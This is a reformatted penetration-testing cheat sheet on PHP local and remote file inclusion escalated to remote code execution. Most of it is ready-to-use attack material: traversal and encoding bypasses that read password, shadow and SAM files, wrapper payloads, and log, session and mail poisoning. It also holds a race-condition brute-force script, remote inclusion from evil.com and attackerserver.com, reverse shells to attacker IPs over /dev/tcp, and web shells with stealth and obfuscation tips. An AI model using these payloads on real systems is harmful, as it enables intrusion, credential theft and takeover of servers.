This is not mine. I reformatted it to .md from the source below.
https://blog.certcube.com/detailed-cheatsheet-lfi-rce-websheels/
credit: Mr. X

## Basic LFI

In the following examples, we include the ```/etc/passwd``` file, check the ```Directory & Path Traversal``` chapter for more interesting files.

```
http://example.com/index.php?page=../../../etc/passwd
```

## Null byte

⚠️ In versions of PHP below 5.3.4 we can terminate with null byte.

```
http://example.com/index.php?page=../../../etc/passwd%00
```

## Double encoding

```
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

## UTF-8 encoding
```
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

## Path and dot truncation
On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away.

```
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```

## Filter bypass tricks

```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

## LFI / RFI using wrappers
### Wrapper php://filter
The part “php://filter” is case insensitive

```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

NOTE :-  Always try without extention if the index.php is not working with this test case .
can be chained with a compression wrapper for large files.

```
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```
NOTE: Wrappers can be chained multiple times : php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s

```
./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page 
curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
```
## Wrapper zip://

```
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

## Wrapper data://

```
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+

## Wrapper expect://

```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

## Wrapper input://

Specify your payload in the POST parameters, this can be done with a simple curl command.

```
curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
```
Alternatively, Kadimus has a module to automate this attack.

```
./kadimus -u "https://example.com/index.php?page=php://input%00"  -C '<?php echo shell_exec("id"); ?>' -T input
```

## Wrapper phar://

Create a phar file with a serialized object in its meta-data.

```
// create new Ph
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

// add object of any class as meta data
class AnyClass {}
$object = new AnyClass;
$object->data = 'rips';
$phar->setMetadata($object);
$phar->stopBuffering();
```

If a file operation is now performed on our existing Phar file via the php:// wrapper, then its serialized metadata is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked

```
class AnyClass {
    function __destruct() {
        echo $this->data;
    }
}
// output: rips
include('phar://test.phar');
```

NOTE: The unserialize is triggered for the phar:// wrapper in any file operation, file_exists and many more.

## LFI to RCE via /proc/*/fd

  1.) Upload a lot of shells (for example : 100)
  2.) Include http://example.com/index.php?page=/proc/$PID/fd/$FD, with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)

## LFI to RCE via /proc/self/environ

Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file

```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

## LFI to RCE via upload

If you can upload a file, just inject the shell payload in it (e.g : <?php system($_GET['c']); ?> ).

```
http://example.com/index.php?page=path/to/uploaded/file.png
```

In order to keep the file readable, it is best to inject into the metadata for the pictures/doc/pdf

## LFI to RCE via upload (race)

Worlds Quietest Let’s Play”

  * Upload a file and trigger a self-inclusion.
  * Repeat 1 a shitload of time to:
  * increase our odds of winning the race
  * increase our guessing odds
  * Bruteforce the inclusion of /tmp/[0-9a-zA-Z]{6}
  * Enjoy our shell.

```
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)

print('[x] Something went wrong, please try again')
```

## LFI to RCE via phpinfo()
https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf Use the script phpInfoLFI.py (also available at https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

## LFI to RCE via a controlled log file

Just append your PHP code into the log file by doing a request to the service (Apache, SSH..) and include the log file.

```
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/nginx/access.log
http://example.com/index.php?page=/var/log/nginx/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```

## RCE via SSH

Try to ssh into the box with a PHP code as username ``` <?php system($_GET["cmd"]);?>. ```

``` 
ssh <?php system($_GET["cmd"]);?>@10.10.10.10 
```

Then include the SSH log files inside the Web Application.

```
http://example.com/index.php?page=/var/log/auth.log&cmd=id
```

## RCE via Mail

First send an email using the open SMTP then include the log file located at http://example.com/index.php?page=/var/log/mail.

```
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```

In some cases you can also send the email with the mail command line.

```
mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
```

## LFI to RCE via PHP sessions
Check if the website use PHP Session (PHPSESSID)

Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] files

/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
Set the cookie to <?php system('cat /etc/passwd');?>

login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
Use the LFI to include the PHP session file

login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
LFI to RCE via credentials files
This method require high privileges inside the application in order to read the sensitive files.

Windows version
First extract sam and system files.

http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
Then extract hashes from these files samdump2 SYSTEM SAM > hashes.txt, and crack them with hashcat/john or replay them using the Pass The Hash technique.

Linux version
First extract /etc/shadow files.

http://example.com/index.php?page=../../../../../../etc/shadow
Then crack the hashes inside in order to login via SSH on the machine.

Basic RFI
Most of the filter bypasses from LFI section can be reused for RFI.

http://example.com/index.php?page=http://evil.com/shell.txt
Null byte
http://example.com/index.php?page=http://evil.com/shell.txt%00
Double encoding
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
Bypass allow_url_include
When allow_url_include and allow_url_fopen are set to Off. It is still possible to include a remote file on Windows box using the smb protocol.

Create a share open to everyone
Write a PHP code inside a file : shell.php
Include it http://example.com/index.php?page=\\10.0.0.1\share\shell.php
Webshell
A webshell is a shell that you can access through the web. This is useful for when you have firewalls that filter outgoing traffic on ports other than port 80. As long as you have a webserver, and want it to function, you can’t filter our traffic on port 80 (and 443). It is also a bit more stealthy than a reverse shell on other ports since the traffic is hidden in the HTTP traffic.

You have access to different kinds of webshells on Kali here:

/usr/share/webshells
PHP
This code can be injected into pages that use PHP IN ORDER TO ACCESS RFI to Shell

Remote file inclusion uses pretty much the same vector as local file inclusion.

A remote file inclusion vulnerability lets the attacker execute a script on the target-machine even though it is not even hosted on that machine.

RFI’s are less common than LFI. Because in order to get them to work the developer must have edited the php.ini configuration file.

This is how they work.

So you have an unsanitized parameter, like this

$incfile = $_REQUEST["file"];
include($incfile.".php");
Now what you can do is to include a file that is not hosted on the victim-server, but instead on the attacker’s server.

http://exampe.com/index.php?page=http://attackerserver.com/evil.txt
And evil.txt will look like something like this:

<?php echo shell_exec("whoami");?>

# Or just get a reverse shell directly like this:
<?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196"); ?>

# Execute one command
<?php system("whoami"); ?>

# Take input from the url paramter. shell.php?cmd=whoami
<?php system($_GET['cmd']); ?>

# The same but using passthru
<?php passthru($_GET['cmd']); ?>

# For shell_exec to output the result you need to echo it
<?php echo shell_exec("whoami");?>

# Exec() does not output the result without echo, and only output the last line. So not very useful!
<?php echo exec("whoami");?>

# Instead to this if you can. It will return the output as an array, and then print it all.
<?php exec("ls -la",$array); print_r($array); ?>

# preg_replace(). This is a cool trick
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>

# Using backticks
<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>

# Using backticks
<?php echo `whoami`; ?>
So when the victim-server includes this file it will automatically execute the commands that are in the evil.txt file. And we have an RCE.

http://192.168.1.103/index.php?page=http://attacker.com/file.txt/php%00cmd=pwd &cmd=/bin/bash –
i >& /dev/tcp/10.11.0.37/53 0>&1

The second Side listen with

nc -lvp 53

Avoid extensions
Remember to add the null byte %00 to avoid appending .php. This will only work on PHP before version 5.3.

If it does not work you can also add a ?, this way the rest will be interpreted as URL parameters

You can then call then execute the commands like this:

http://192.168.1.103/index.php?cmd=pwd
Make it stealthy
We can make the commands from above a bit more stealthy. Instead of passing the cards through the URL, which will be obvious in logs, we can pass them through other header-parameters. The use of tamper data or burp suite to insert the commands. Or just Netcat or curl.

<?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>
<?php system($_SERVER['HTTP_USER_AGENT'])?>

# I have had to use this one
<?php echo passthru($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>
Obfuscation
The following functions can be used to obfuscate the code.

eval()
assert()
base64()
gzdeflate()
str_rot13()
Weevely – Incredible tool!
Using weevely we can create PHP web shells easily.

weevely generate password /root/webshell.php
Not we execute it and get a shell in return:

weevely "http://192.168.1.101/webshell.php" password
ASP
<%
Dim oS
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Call oS.Run("win.com cmd.exe /c c:\Inetpub\shell443.exe",0,True)
%>
/something/access.log injection
If you have LFI access to any web server error or access log files, you can attempt to inject malicious PHP code. Once the PHP code is written to the access.log and is reloaded, it will be displayed in your web browser as processed PHP. After adding the injected variable to our URL to we’ll have code execution.

First, we’ll attempt to inject by using Netcat.

root@kali:~# nc 192.168.72.134 80

<?php echo shell_exec($_GET['cmd']);?>

Now test if the injection was successful by including the new cmd variable into the URL.

?page=../../../../../var/log/apache2/access.log&cmd=/sbin/ifconfig
Depending on the circumstance the log file may be very very big. Scroll all the way down to check if the command execution was successful.
